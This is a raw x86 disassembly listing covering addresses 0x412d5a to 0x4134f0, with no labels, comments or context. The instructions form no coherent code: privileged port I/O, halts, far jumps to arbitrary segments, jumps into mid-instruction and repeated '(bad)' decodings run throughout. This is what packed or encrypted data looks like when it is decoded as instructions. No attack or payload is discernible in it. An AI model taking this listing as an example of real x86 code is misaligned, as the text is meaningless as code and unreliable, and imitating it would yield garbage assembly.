  412d5a:	lods   al,BYTE PTR ds:[esi]
  412d5b:	xchg   ebp,eax
  412d5c:	xchg   ecx,eax
  412d5d:	aaa    
  412d5e:	sub    edi,DWORD PTR [edx+0x58]
  412d61:	dec    ebp
  412d62:	xor    edi,DWORD PTR [edi+0x27]
  412d65:	enter  0x9025,0x2a
  412d69:	xchg   esp,esi
  412d6b:	nop
  412d6c:	sbb    cl,dh
  412d6e:	xor    DWORD PTR [esi+0x240e4a6e],0xffffffdf
  412d75:	rol    DWORD PTR [eax-0x47],cl
  412d78:	inc    esp
  412d79:	repnz lahf 
  412d7b:	xchg   ebp,eax
  412d7c:	or     al,0x7
  412d7e:	inc    ecx
  412d7f:	imul   edx,DWORD PTR [esi-0x79],0xa01e1b9b
  412d86:	sbb    edi,DWORD PTR [esi+0x75a1edac]
  412d8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d8d:	sub    edx,DWORD PTR [ebx]
  412d8f:	scas   eax,DWORD PTR es:[edi]
  412d90:	or     esi,DWORD PTR [eax]
  412d92:	imul   ebx,DWORD PTR [ebp+0x35794583],0xc0c8efdc
  412d9c:	mov    dh,0xac
  412d9e:	mov    ebx,0xb80b8efb
  412da3:	push   ecx
  412da4:	sub    dl,dl
  412da6:	pop    es
  412da7:	fdiv   DWORD PTR [edi]
  412da9:	rcl    DWORD PTR [ecx-0x7a],cl
  412dac:	retf   
  412dad:	ins    DWORD PTR es:[edi],dx
  412dae:	mov    al,ds:0xcc39e337
  412db3:	fwait
  412db4:	dec    ebx
  412db5:	pop    ebp
  412db6:	mov    esi,0x6072a4a7
  412dbb:	clc    
  412dbc:	aaa    
  412dbd:	lahf   
  412dbe:	out    0xb,eax
  412dc0:	std    
  412dc1:	dec    edx
  412dc2:	int    0x67
  412dc4:	xchg   ebx,eax
  412dc5:	push   ebp
  412dc6:	adc    bl,cl
  412dc8:	out    dx,al
  412dc9:	add    DWORD PTR [eax-0x6c7db67b],0x66
  412dd0:	xchg   ebx,eax
  412dd1:	pop    es
  412dd2:	loop   0x412dec
  412dd4:	jno    0x412e1c
  412dd6:	and    ah,bl
  412dd8:	inc    edi
  412dd9:	pop    ss
  412dda:	hlt    
  412ddb:	int3   
  412ddc:	pusha  
  412ddd:	fdiv   DWORD PTR [ecx-0x5e60a97e]
  412de3:	inc    edx
  412de4:	rsqrtps xmm6,XMMWORD PTR [edx+0x12]
  412de8:	sbb    bh,bh
  412dea:	outs   dx,BYTE PTR ds:[esi]
  412deb:	sbb    ah,BYTE PTR [ecx+0x19af8921]
  412df1:	arpl   dx,dx
  412df3:	pop    ebx
  412df4:	rcl    BYTE PTR [esi+esi*4-0x4f],1
  412df8:	iret   
  412df9:	arpl   WORD PTR [ecx],sp
  412dfb:	add    eax,0x6cefab14
  412e00:	push   ds
  412e01:	loope  0x412da9
  412e03:	fsub   QWORD PTR [esi]
  412e05:	or     DWORD PTR [ebx-0x71b6646a],esi
  412e0b:	sub    dl,BYTE PTR [eax+0x2c]
  412e0e:	fdivr  QWORD PTR [edx]
  412e10:	pop    ss
  412e11:	xchg   ebp,eax
  412e12:	int    0x8a
  412e14:	fsub   QWORD PTR [edx+0x5e]
  412e17:	push   ss
  412e18:	data16 xor al,0x27
  412e1b:	adc    BYTE PTR [eax-0x5d27197],ah
  412e21:	pop    ss
  412e22:	mov    bl,0x58
  412e24:	ret    0x7e7
  412e27:	in     al,dx
  412e28:	add    DWORD PTR es:[bx+si],edx
  412e2c:	int    0xe8
  412e2e:	sti    
  412e2f:	fsubr  DWORD PTR [esi+0x6abc353c]
  412e35:	xor    esp,esp
  412e37:	mov    bh,0x5e
  412e39:	push   ebx
  412e3a:	pushf  
  412e3b:	jle    0x412e27
  412e3d:	fimul  WORD PTR [ecx-0x21a3a139]
  412e43:	mov    ecx,0xf2a9b40e
  412e48:	push   0xc723d803
  412e4d:	(bad)  
  412e4e:	fnstenv [ebx]
  412e50:	frstor [ebp-0x51a60b1]
  412e56:	pop    edx
  412e57:	sub    WORD PTR [edi],di
  412e5a:	imul   esi,DWORD PTR [ebx],0xff4a7817
  412e60:	call   DWORD PTR [edx+0x16fa09ae]
  412e66:	add    BYTE PTR [ecx],bh
  412e68:	les    ebp,FWORD PTR [ecx-0x2f4be2de]
  412e6e:	test   al,0x64
  412e70:	xor    al,0x5
  412e72:	push   edx
  412e73:	jle    0x412e5a
  412e75:	or     al,0x6e
  412e77:	das    
  412e78:	stos   DWORD PTR es:[edi],eax
  412e79:	and    DWORD PTR [edi+0x7],edx
  412e7c:	nop
  412e7d:	rol    BYTE PTR [esi-0x22],1
  412e80:	push   ebx
  412e81:	and    dl,BYTE PTR [eax+ebp*4]
  412e84:	les    eax,FWORD PTR [ecx-0x80]
  412e87:	inc    edx
  412e88:	shl    bh,0xdd
  412e8b:	pop    esp
  412e8c:	add    bh,cl
  412e8e:	jge    0x412ea4
  412e90:	pop    edx
  412e91:	ds inc ecx
  412e93:	pusha  
  412e94:	in     eax,0xe4
  412e96:	push   ss
  412e97:	adc    BYTE PTR [edi+edx*8],bh
  412e9a:	shl    DWORD PTR [edi+0x53],0xea
  412e9e:	je     0x412e9c
  412ea0:	xor    eax,0x5eee18ff
  412ea5:	xor    DWORD PTR [eax],eax
  412ea7:	xor    bh,BYTE PTR [edx+0x64]
  412eaa:	sbb    eax,edi
  412eac:	dec    edx
  412ead:	mov    dl,0x45
  412eaf:	daa    
  412eb0:	sbb    cl,ch
  412eb2:	in     eax,dx
  412eb3:	inc    edx
  412eb4:	dec    cx
  412eb6:	xchg   BYTE PTR ds:0xe73018c2,bl
  412ebc:	and    bh,0x68
  412ebf:	shr    BYTE PTR [esi+0x65245ee6],1
  412ec5:	retf   
  412ec6:	scas   al,BYTE PTR es:[edi]
  412ec7:	idiv   dh
  412ec9:	jae    0x412f04
  412ecb:	inc    esp
  412ecc:	loop   0x412ecd
  412ece:	int    0xfc
  412ed0:	stc    
  412ed1:	hlt    
  412ed2:	fadd   st,st(0)
  412ed4:	pop    edi
  412ed5:	xor    dl,bl
  412ed7:	pushf  
  412ed8:	fs cmp al,dh
  412edb:	fisub  DWORD PTR [ebx+ebp*2+0x71]
  412edf:	gs out dx,al
  412ee1:	sbb    eax,0xccd3608c
  412ee6:	jmp    0xbfcf:0xa0e0860f
  412eed:	stos   DWORD PTR es:[edi],eax
  412eee:	xor    dl,BYTE PTR [esi+0xa]
  412ef1:	in     eax,dx
  412ef2:	mov    ds:0xe11d65f1,al
  412ef7:	cli    
  412ef8:	cmp    dh,BYTE PTR [ebx-0x6e]
  412efb:	(bad)  
  412efc:	mov    ebp,0xc10347f8
  412f01:	pop    ecx
  412f02:	(bad)  
  412f03:	jecxz  0x412f83
  412f05:	ins    BYTE PTR es:[edi],dx
  412f06:	cmp    cl,BYTE PTR [esi-0x59185be1]
  412f0c:	mov    ds:0x351e86b6,al
  412f11:	mov    edi,0x8f9163f2
  412f16:	cmp    ch,BYTE PTR [ecx]
  412f18:	xor    al,0xb0
  412f1a:	retf   
  412f1b:	sbb    ebp,ebx
  412f1d:	inc    eax
  412f1e:	mov    eax,ds:0x6e047096
  412f23:	push   0x5b
  412f25:	out    0xc1,al
  412f27:	jecxz  0x412efd
  412f29:	icebp  
  412f2a:	add    al,0x6a
  412f2c:	bound  esp,QWORD PTR [edi+0x4e]
  412f2f:	xchg   edi,eax
  412f30:	scas   al,BYTE PTR es:[edi]
  412f31:	ds stos DWORD PTR es:[edi],eax
  412f33:	cs call 0xd33:0xbdfd0f19
  412f3b:	xor    eax,0xb04fd2a8
  412f40:	stc    
  412f41:	cmp    edx,DWORD PTR [ebx-0x7d9b346]
  412f47:	shl    DWORD PTR [ebp-0x2cddbb73],cl
  412f4d:	lods   eax,DWORD PTR ds:[esi]
  412f4e:	and    dh,0xd9
  412f51:	xchg   edx,eax
  412f52:	js     0x412f35
  412f54:	into   
  412f55:	ret    
  412f56:	pop    es
  412f57:	jmp    0xcc4d:0xb3fe014b
  412f5e:	in     eax,0xbf
  412f60:	mov    ds:0x9b84288c,eax
  412f65:	push   ds
  412f66:	stos   BYTE PTR es:[edi],al
  412f67:	xor    ebx,eax
  412f69:	lock jne 0x412f39
  412f6c:	adc    al,BYTE PTR [ecx+ebx*4]
  412f6f:	adc    cl,BYTE PTR [esi]
  412f71:	aam    0xcb
  412f73:	jg     0x412f36
  412f75:	mov    ebp,eax
  412f77:	xlat   BYTE PTR ds:[ebx]
  412f78:	std    
  412f79:	stos   DWORD PTR es:[edi],eax
  412f7a:	adc    DWORD PTR [edi+0x27],edi
  412f7d:	nop
  412f7e:	fadd   QWORD PTR [ebx+0x1b]
  412f81:	fsub   st(7),st
  412f83:	jnp    0x412fa5
  412f85:	cmp    eax,0x6199ece2
  412f8a:	jae    0x412f61
  412f8c:	in     al,0x34
  412f8e:	jno    0x412f26
  412f90:	jp     0x412f62
  412f92:	pop    ss
  412f93:	js     0x413010
  412f95:	cmp    ecx,DWORD PTR [edx-0x65]
  412f98:	je     0x412f9f
  412f9a:	dec    edx
  412f9b:	pop    es
  412f9c:	test   al,ah
  412f9e:	or     eax,DWORD PTR [ecx+0x2c]
  412fa1:	push   ebp
  412fa2:	gs fdivrp st(3),st
  412fa5:	ret    0x62df
  412fa8:	push   ebp
  412fa9:	mov    ds:0xc063800c,al
  412fae:	mov    ch,dl
  412fb0:	ret    0x7fe6
  412fb3:	call   0xc06:0xb4e5034c
  412fba:	imul   eax,esi,0x3b1dbbd1
  412fc0:	mov    ebx,0x1807e6e0
  412fc5:	sub    BYTE PTR [ecx],ch
  412fc7:	cwde   
  412fc8:	mov    bh,0x4b
  412fca:	sub    BYTE PTR [edx+0x18],cl
  412fcd:	jae    0x412fcd
  412fcf:	mov    ds:0x6121d5a6,eax
  412fd4:	push   cs
  412fd5:	pop    eax
  412fd6:	jno    0x412f6d
  412fd8:	call   0x54ab738d
  412fdd:	cmp    al,0x9a
  412fdf:	cwde   
  412fe0:	sub    eax,0x13f7f5e6
  412fe5:	inc    ebp
  412fe6:	mov    dl,0x15
  412fe8:	test   eax,0x982da37b
  412fed:	call   0xf4add8c2
  412ff2:	rcr    BYTE PTR [ebx-0x41fbb391],cl
  412ff8:	add    DWORD PTR [esi-0x6893745f],0x7b
  412fff:	cmp    eax,0xe5b32f36
  413004:	mov    ah,0xc3
  413006:	jp     0x412fe7
  413008:	cdq    
  413009:	mov    fs,edi
  41300b:	int    0x76
  41300d:	push   ecx
  41300e:	test   al,0xa2
  413010:	jnp    0x412fe0
  413012:	mov    ch,0x2e
  413014:	mov    ch,BYTE PTR [eax-0x6d]
  413017:	sar    DWORD PTR [ecx],cl
  413019:	pop    edi
  41301a:	hlt    
  41301b:	shl    DWORD PTR [ecx+0x45],1
  41301e:	mov    cl,0xdf
  413020:	ficom  DWORD PTR [ebp-0x7]
  413023:	js     0x412fd8
  413025:	inc    eax
  413026:	fwait
  413027:	mov    ah,0x4
  413029:	(bad)
  41302d:	pop    esp
  41302e:	mov    edi,0xf47884e3
  413033:	sub    al,0x1a
  413035:	fiadd  DWORD PTR [ebx-0x3a]
  413038:	popa   
  413039:	test   ecx,ebx
  41303b:	xchg   BYTE PTR [edx+edx*1+0x11],bh
  41303f:	stos   DWORD PTR es:[edi],eax
  413040:	inc    esp
  413041:	out    0xe8,al
  413043:	jge    0x4130af
  413045:	inc    edi
  413046:	sub    eax,0x5e0ed4c4
  41304b:	mov    ch,0xa0
  41304d:	nop
  41304e:	fcomp  DWORD PTR [edx+ecx*2]
  413051:	cli    
  413052:	jge    0x413095
  413054:	fcmovu st,st(4)
  413056:	pop    ecx
  413057:	jecxz  0x4130ce
  413059:	mov    ch,0xda
  41305b:	mov    ecx,DWORD PTR [esi]
  41305d:	cs int 0x89
  413060:	mov    DWORD PTR [ebp+0x54bdd209],0x5cfdd1d8
  41306a:	js     0x4130d8
  41306c:	jns    0x4130b2
  41306e:	pop    ecx
  41306f:	xchg   ebx,eax
  413070:	cwde   
  413071:	push   ecx
  413072:	out    0xeb,eax
  413074:	jnp    0x413050
  413076:	idiv   ebx
  413078:	pop    eax
  413079:	imul   esp,eax,0x15
  41307c:	out    0xef,al
  41307e:	or     eax,0x619664be
  413083:	stc    
  413084:	in     al,0xea
  413086:	sub    al,0xb7
  413088:	cdq    
  413089:	inc    eax
  41308a:	shl    ch,cl
  41308c:	inc    edx
  41308d:	cmp    ch,BYTE PTR [ecx+0xf]
  413090:	call   0x2d2e:0xb4541b7b
  413097:	nop
  413098:	(bad)  
  413099:	fst    QWORD PTR [eax+eiz*2+0x26ccc7aa]
  4130a0:	pop    ds
  4130a1:	popa   
  4130a2:	push   0xcb39346d
  4130a7:	lea    esi,[edx+0xd07aef9]
  4130ad:	or     al,0x64
  4130af:	into   
  4130b0:	fistp  QWORD PTR [edx]
  4130b2:	mov    dh,0xb6
  4130b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130b5:	push   0xd674b1c7
  4130ba:	jecxz  0x4130a8
  4130bc:	pop    eax
  4130bd:	push   esp
  4130be:	push   ss
  4130bf:	sub    DWORD PTR [ebx+0x27d9b67d],esi
  4130c5:	jle    0x4130fb
  4130c7:	outs   dx,DWORD PTR ds:[esi]
  4130c8:	inc    ebp
  4130c9:	adc    edx,DWORD PTR [ecx]
  4130cb:	pop    esp
  4130cc:	sti    
  4130cd:	int3   
  4130ce:	into   
  4130cf:	shl    BYTE PTR [esi+0x4d],1
  4130d2:	cmp    DWORD PTR [ebx],esi
  4130d4:	push   edi
  4130d5:	imul   eax,DWORD PTR [ecx-0x28],0xaf75494b
  4130dc:	cmp    BYTE PTR [esi+0x2c],dl
  4130df:	xor    DWORD PTR [edx+0x2b],esi
  4130e2:	sbb    BYTE PTR [edx+0x2f],0x31
  4130e6:	cmp    DWORD PTR [ebx],ebp
  4130e8:	sub    eax,0x4e480cc3
  4130ed:	sub    ebx,edx
  4130ef:	dec    esi
  4130f0:	push   eax
  4130f1:	cmp    al,0x6d
  4130f3:	and    DWORD PTR [edi],edi
  4130f5:	inc    ecx
  4130f6:	xchg   edi,eax
  4130f7:	jnp    0x413097
  4130f9:	int    0x8d
  4130fb:	lods   al,BYTE PTR ds:[esi]
  4130fc:	xor    DWORD PTR [edi+edi*8],ecx
  4130ff:	sbb    al,0xdf
  413101:	mov    dh,0x4d
  413103:	popa   
  413104:	cmp    DWORD PTR [esi-0x617439af],esi
  41310a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41310b:	je     0x4130aa
  41310d:	inc    eax
  41310e:	mov    eax,0xbcd2b939
  413113:	jae    0x41309c
  413115:	xchg   edx,eax
  413116:	aam    0xdf
  413118:	sahf   
  413119:	pop    edi
  41311a:	pop    edi
  41311b:	out    0x2d,eax
  41311d:	pop    edi
  41311e:	jmp    0xd561:0x8a359f19
  413125:	jbe    0x413128
  413127:	icebp  
  413128:	mov    dh,BYTE PTR [ebx-0x7f]
  41312b:	jg     0x413161
  41312d:	repnz nop
  41312f:	jp     0x4130ba
  413131:	std    
  413132:	mov    bl,0xcb
  413134:	and    BYTE PTR ds:0xa9037e82,0xfb
  41313b:	cwde   
  41313c:	ret    0x91d2
  41313f:	jnp    0x41310f
  413141:	lods   al,BYTE PTR ds:[esi]
  413142:	mov    edx,0x63d50db4
  413147:	jbe    0x413143
  413149:	loopne 0x4130f6
  41314b:	outs   dx,BYTE PTR ds:[esi]
  41314c:	jb     0x41315f
  41314e:	pusha  
  41314f:	push   eax
  413150:	fs add al,0xaf
  413153:	xor    esi,DWORD PTR [esi+0x56071ffd]
  413159:	js     0x413111
  41315b:	in     eax,dx
  41315c:	jmp    0x9f43:0x8fb324d0
  413163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413164:	scas   al,BYTE PTR es:[edi]
  413165:	push   esi
  413166:	pop    ds
  413167:	daa    
  413168:	sbb    BYTE PTR [edx],dl
  41316a:	(bad)  [edi]
  41316c:	fdiv   DWORD PTR [esi]
  41316e:	out    dx,eax
  41316f:	mov    ch,0x48
  413171:	jns    0x413146
  413173:	sahf   
  413174:	push   eax
  413175:	add    ch,0xde
  413178:	rcr    DWORD PTR [edx+0x6c1f124f],1
  41317e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41317f:	stos   BYTE PTR es:[edi],al
  413180:	jo     0x41313e
  413182:	mov    edi,0x6f4757da
  413187:	sbb    ecx,ecx
  413189:	test   BYTE PTR [ecx-0x5afd5d01],0xaf
  413190:	dec    edx
  413191:	jle    0x413159
  413193:	sub    ebx,DWORD PTR [ecx]
  413195:	jp     0x413151
  413197:	mov    WORD PTR [edx],fs
  413199:	(bad)  
  41319a:	cmp    ebp,DWORD PTR [ebp-0x3a689909]
  4131a0:	add    edx,DWORD PTR [eax-0x50]
  4131a3:	cmp    BYTE PTR [eax+0x50],ch
  4131a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131a7:	mov    al,0x9e
  4131a9:	cmp    bh,BYTE PTR [esi+0x7f5c114]
  4131af:	push   ebx
  4131b0:	xchg   ecx,eax
  4131b1:	data16 js 0x4131f8
  4131b4:	push   0x46
  4131b6:	cmp    DWORD PTR [ebp+0x132d746e],ebx
  4131bc:	jp     0x41318d
  4131be:	adc    BYTE PTR ds:0xcc708735,dh
  4131c4:	outs   dx,DWORD PTR ds:[esi]
  4131c5:	sahf   
  4131c6:	mov    ah,0xb
  4131c8:	pop    ebx
  4131c9:	cwde   
  4131ca:	fild   WORD PTR [eax-0x6603e8c3]
  4131d0:	sub    al,0x18
  4131d2:	xchg   DWORD PTR [ebp-0x2bfa421d],edi
  4131d8:	sub    al,BYTE PTR [esi+ecx*4]
  4131db:	pushf  
  4131dc:	hlt    
  4131dd:	cld    
  4131de:	out    0xc3,al
  4131e0:	shrd   edi,esi,0x18
  4131e4:	and    edi,ebx
  4131e6:	sahf   
  4131e7:	aam    0xf0
  4131e9:	mov    edi,0x1d3aebb6
  4131ee:	data16 and BYTE PTR gs:[eax+0x1d4ec062],ah
  4131f6:	arpl   sp,bx
  4131f8:	std    
  4131f9:	addr16 (bad) 
  4131fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131fc:	xchg   esp,ebp
  4131fe:	cdq    
  4131ff:	aas    
  413200:	mov    dl,0x57
  413202:	sbb    dl,BYTE PTR [ebx-0x6f2fd5a3]
  413208:	add    esi,DWORD PTR [ebx+ebx*4]
  41320b:	js     0x413236
  41320d:	test   al,0xa4
  41320f:	add    cl,bh
  413211:	xchg   edi,eax
  413213:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413214:	enter  0xd764,0xf2
  413218:	push   ds
  413219:	popf   
  41321a:	adc    edx,DWORD PTR [eax+edx*2+0x63]
  41321e:	dec    ecx
  41321f:	adc    BYTE PTR [edi-0x25b04000],ch
  413225:	das    
  413226:	sub    dl,BYTE PTR [edx-0x69]
  413229:	mov    eax,ds:0xa9b74b24
  41322e:	adc    ebp,esp
  413230:	cli    
  413231:	push   0x71
  413233:	pop    ss
  413234:	inc    eax
  413235:	cmp    DWORD PTR [edx-0x3b],esp
  413238:	ror    BYTE PTR [esi-0x2f425f96],cl
  41323e:	outs   dx,BYTE PTR ds:[esi]
  41323f:	xchg   ebx,eax
  413240:	les    ebx,FWORD PTR [eax+esi*4]
  413243:	sub    al,0x7c
  413245:	push   edi
  413246:	sbb    eax,0x75f2ac62
  41324b:	xor    al,0x45
  41324d:	push   eax
  41324e:	repz mov ds:0xe98a058a,al
  413254:	nop    DWORD PTR [edx]
  413257:	dec    edx
  413258:	mov    ebp,0xe78a9c2a
  41325d:	jge    0x413209
  41325f:	div    ecx
  413261:	push   ds
  413262:	pop    ebx
  413263:	adc    BYTE PTR [edi],bh
  413265:	jmp    DWORD PTR [esi+ebp*1-0x1f56cc58]
  41326c:	mov    fs,WORD PTR [esi]
  41326e:	mov    ah,0xcf
  413270:	ret    
  413271:	sbb    eax,0x68026a62
  413276:	cmp    esi,ebp
  413278:	pop    edi
  413279:	int3   
  41327a:	sbb    bh,BYTE PTR [edx+ebp*8-0x3aaa22e7]
  413281:	mov    eax,ds:0x786deb6d
  413286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413287:	pop    edx
  413288:	mov    cl,BYTE PTR [esi+0x19]
  41328b:	or     ebx,esp
  41328d:	or     al,0x9f
  41328f:	adc    BYTE PTR [edi],0x39
  413292:	add    BYTE PTR [ebp-0x38],al
  413295:	sbb    al,0xd9
  413297:	inc    ebp
  413298:	or     esp,ebx
  41329a:	inc    ebp
  41329b:	mov    DWORD PTR [ebp-0x43],ebp
  41329e:	or     BYTE PTR [ebx],0xc1
  4132a1:	or     al,0xf2
  4132a3:	and    al,0x9f
  4132a5:	stc    
  4132a6:	push   edx
  4132a7:	xchg   edi,eax
  4132a8:	adc    eax,0xd8776803
  4132ad:	and    eax,0xac599325
  4132b2:	out    0x9,al
  4132b4:	sbb    BYTE PTR [edx],bl
  4132b6:	mov    esp,0x97486e05
  4132bb:	pop    ss
  4132bc:	push   0x3a
  4132be:	mov    cl,0xcb
  4132c0:	sbb    DWORD PTR [ecx],ebx
  4132c2:	sti    
  4132c3:	jl     0x413288
  4132c5:	or     BYTE PTR [ecx+0x2b],ah
  4132c8:	int3   
  4132c9:	jg     0x41325d
  4132cb:	jmp    0xe9e5db98
  4132d0:	ins    DWORD PTR es:[edi],dx
  4132d1:	int3   
  4132d2:	sbb    al,0x49
  4132d4:	sahf   
  4132d5:	hlt    
  4132d6:	loope  0x41333d
  4132d8:	sar    ebp,0xfd
  4132db:	cmp    eax,0xa2665ed0
  4132e0:	and    DWORD PTR [ecx-0x23],esp
  4132e3:	push   ds
  4132e4:	cmp    DWORD PTR [ebp-0x4a591a23],0xbcb279ca
  4132ee:	jge    0x4132e8
  4132f0:	int    0x40
  4132f2:	pop    esp
  4132f3:	aam    0x59
  4132f5:	cli    
  4132f6:	test   al,0x36
  4132f8:	ficomp WORD PTR [edi]
  4132fa:	xor    DWORD PTR [esi+ebp*4-0x1a34bc6d],esp
  413301:	jmp    0xe0902521
  413306:	xchg   esi,eax
  413307:	mov    bl,0x9
  413309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41330a:	inc    ecx
  41330b:	mov    ah,0x8
  41330d:	inc    ecx
  41330e:	lock pop ss
  413310:	in     eax,dx
  413311:	xchg   esp,eax
  413312:	(bad)  
  413313:	imul   esp,DWORD PTR [edi-0x3ae3c267],0x6e
  41331a:	bound  ebx,QWORD PTR [edx]
  41331c:	dec    esi
  41331d:	mov    al,0xd9
  41331f:	adc    eax,DWORD PTR [eax]
  413321:	stos   BYTE PTR es:[edi],al
  413322:	add    esi,DWORD PTR [esi-0x51]
  413325:	in     eax,0x78
  413327:	sbb    al,0x5d
  413329:	xchg   edi,eax
  41332a:	dec    ebp
  41332b:	and    DWORD PTR [ebx],esi
  41332d:	jne    0x413347
  41332f:	call   FWORD PTR [esi+eiz*4-0x6d]
  413333:	adc    BYTE PTR [edi],ch
  413335:	inc    eax
  413336:	mov    edx,0x7dc09787
  41333b:	jmp    0x73607ee0
  413340:	dec    esi
  413341:	cdq    
  413342:	jne    0x41332f
  413344:	fucomp st(4)
  413346:	jle    0x41331b
  413348:	mov    ebx,0x5070089
  41334d:	mov    ebx,gs
  41334f:	lds    esp,FWORD PTR [ebx+eax*2]
  413352:	or     eax,0x59222570
  413357:	jnp    0x41339c
  413359:	push   esp
  41335a:	cdq    
  41335b:	bound  ebp,QWORD PTR [eax-0x2964a060]
  413361:	cli    
  413362:	push   ecx
  413363:	pop    es
  413364:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  413366:	clc    
  413367:	mov    ebx,0x64b20124
  41336c:	sbb    eax,ebp
  41336e:	mov    ch,0xc1
  413370:	int    0x4b
  413372:	ins    BYTE PTR es:[edi],dx
  413373:	xor    bl,BYTE PTR ds:0x874d65f1
  413379:	xor    eax,0x4eb8f603
  41337e:	imul   eax,DWORD PTR [ebx+0x78],0x8707e593
  413385:	mov    eax,ds:0xe263ff45
  41338a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41338b:	cwde   
  41338c:	mov    cl,0x84
  41338e:	xor    dh,bl
  413390:	or     DWORD PTR [edi],ebx
  413392:	sub    BYTE PTR [eax+0x939252d],dh
  413398:	loope  0x413332
  41339a:	pop    esi
  41339b:	rol    DWORD PTR [eax],1
  41339d:	sbb    edx,ebx
  41339f:	jmp    0x413391
  4133a1:	mov    al,0x0
  4133a3:	pop    ebx
  4133a4:	xchg   BYTE PTR [eax],dl
  4133a6:	mov    ebx,DWORD PTR ds:[ebx+ebx*4]
  4133aa:	pusha  
  4133ab:	ret    
  4133ac:	xchg   BYTE PTR [edi],dh
  4133ae:	or     eax,0xd8402c94
  4133b3:	aam    0x4c
  4133b5:	pop    eax
  4133b6:	mov    al,0x65
  4133b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133b9:	mov    ch,0xdb
  4133bb:	aas    
  4133bc:	pusha  
  4133bd:	jmp    0x3fc9405
  4133c2:	and    edi,ecx
  4133c4:	adc    ch,bh
  4133c6:	gs pop ss
  4133c8:	dec    ebp
  4133c9:	int3   
  4133ca:	pushf  
  4133cb:	adc    ebx,eax
  4133cd:	cmp    eax,0x27a08c92
  4133d2:	cmc    
  4133d3:	mov    esi,DWORD PTR [eax]
  4133d5:	nop
  4133d6:	push   DWORD PTR [esi+eiz*8-0x2b]
  4133da:	xchg   BYTE PTR [ecx],ch
  4133dc:	iret   
  4133dd:	leave  
  4133de:	xchg   ah,al
  4133e0:	add    cl,BYTE PTR [ebx+0x5ae13f58]
  4133e6:	jnp    0x41343c
  4133e8:	test   DWORD PTR ds:0x83c101d4,edx
  4133ee:	push   eax
  4133ef:	or     al,0xd2
  4133f1:	sub    al,BYTE PTR [eax-0x30]
  4133f4:	mov    bh,0x54
  4133f6:	dec    esp
  4133f7:	mov    eax,ds:0x834ec40b
  4133fc:	or     al,0xdc
  4133fe:	push   cs
  4133ff:	add    DWORD PTR ds:0x9391cb41,eax
  413405:	andnps xmm3,XMMWORD PTR ds:0xd88caa8b
  41340c:	jae    0x41347a
  41340e:	fcomp  QWORD PTR [edx+edi*4-0x2a]
  413412:	lods   al,BYTE PTR ds:[esi]
  413413:	inc    eax
  413414:	stos   BYTE PTR es:[edi],al
  413415:	sahf   
  413416:	imul   edi,DWORD PTR [ebx-0x38],0x5f4585a2
  41341d:	stos   BYTE PTR es:[edi],al
  41341e:	out    0xce,eax
  413420:	inc    esp
  413421:	xor    DWORD PTR [esi+ebp*1-0x4bf281d1],esi
  413428:	lea    edx,[ebx-0x48182d07]
  41342e:	xor    bl,ch
  413430:	inc    esi
  413431:	mov    esi,0x3ff0f346
  413436:	scas   al,BYTE PTR es:[edi]
  413437:	xlat   BYTE PTR ds:[ebx]
  413438:	cs int3 
  41343a:	(bad)  
  41343b:	pop    ds
  41343c:	outs   dx,DWORD PTR ds:[esi]
  41343d:	loop   0x41341f
  41343f:	dec    ebp
  413440:	and    esi,ebx
  413442:	mov    edx,DWORD PTR [eax+ebx*1-0x68]
  413446:	mov    ah,0x2e
  413448:	outs   dx,DWORD PTR ds:[esi]
  413449:	cld    
  41344a:	push   ebx
  41344b:	add    BYTE PTR [ebp-0x1efdbc22],al
  413451:	fcomp  QWORD PTR [esi+0x382cb9b2]
  413457:	dec    esi
  413458:	add    ebx,DWORD PTR [ebx+0x35]
  41345b:	mul    BYTE PTR [esi+0x41c7d9b2]
  413461:	cmc    
  413462:	and    dh,al
  413464:	mov    bh,0x85
  413466:	pop    ds
  413467:	les    esi,FWORD PTR [ecx]
  413469:	test   DWORD PTR [edx],edi
  41346b:	mov    edi,0x7f524fcb
  413470:	shl    esp,0xb
  413473:	jbe    0x4134d8
  413475:	sbb    eax,0x4b5eea9c
  41347a:	inc    ebp
  41347b:	jl     0x4134c1
  41347d:	and    DWORD PTR [ecx+0x66b262fe],ecx
  413483:	sub    esi,DWORD PTR [esi-0x27ab708f]
  413489:	xor    BYTE PTR [ecx-0x41],cl
  41348c:	xchg   edi,eax
  41348d:	pop    bp
  41348f:	adc    DWORD PTR [esi+eiz*8+0x2a2fca0],esp
  413496:	icebp  
  413497:	xchg   BYTE PTR [edi-0x481f78d5],cl
  41349d:	cmc    
  41349e:	inc    edx
  41349f:	out    dx,eax
  4134a0:	adc    BYTE PTR [edx],al
  4134a2:	ret    
  4134a3:	xor    DWORD PTR [esi-0x2e1c1ee4],eax
  4134a9:	jne    0x4134e8
  4134ab:	pop    edi
  4134ac:	scas   al,BYTE PTR es:[edi]
  4134ad:	jno    0x413529
  4134af:	jo     0x41350c
  4134b1:	pop    DWORD PTR ds:0xb4b06a3f
  4134b7:	sub    al,0x7b
  4134b9:	inc    ecx
  4134ba:	jmp    0xeee9375c
  4134bf:	not    BYTE PTR [edi]
  4134c1:	(bad)  
  4134c2:	out    dx,eax
  4134c3:	(bad)  
  4134c4:	scas   al,BYTE PTR es:[edi]
  4134c5:	(bad)  
  4134c6:	lds    ebp,FWORD PTR ds:0xc4db518f
  4134cc:	dec    eax
  4134cd:	pushf  
  4134ce:	add    DWORD PTR [ebp-0x78f0a25c],ecx
  4134d4:	int    0x47
  4134d6:	out    dx,eax
  4134d7:	(bad)  
  4134d9:	ins    DWORD PTR es:[edi],dx
  4134da:	(bad)  
  4134db:	cli    
  4134dc:	xchg   BYTE PTR [eax],bl
  4134de:	cwde   
  4134df:	call   DWORD PTR ds:0xaf70c4a9
  4134e5:	in     eax,dx
  4134e6:	call   0x31bb3dff
  4134eb:	(bad)  
  4134ed:	leave  
  4134ee:	out    0x5b,eax
  4134f0:	pop    esi
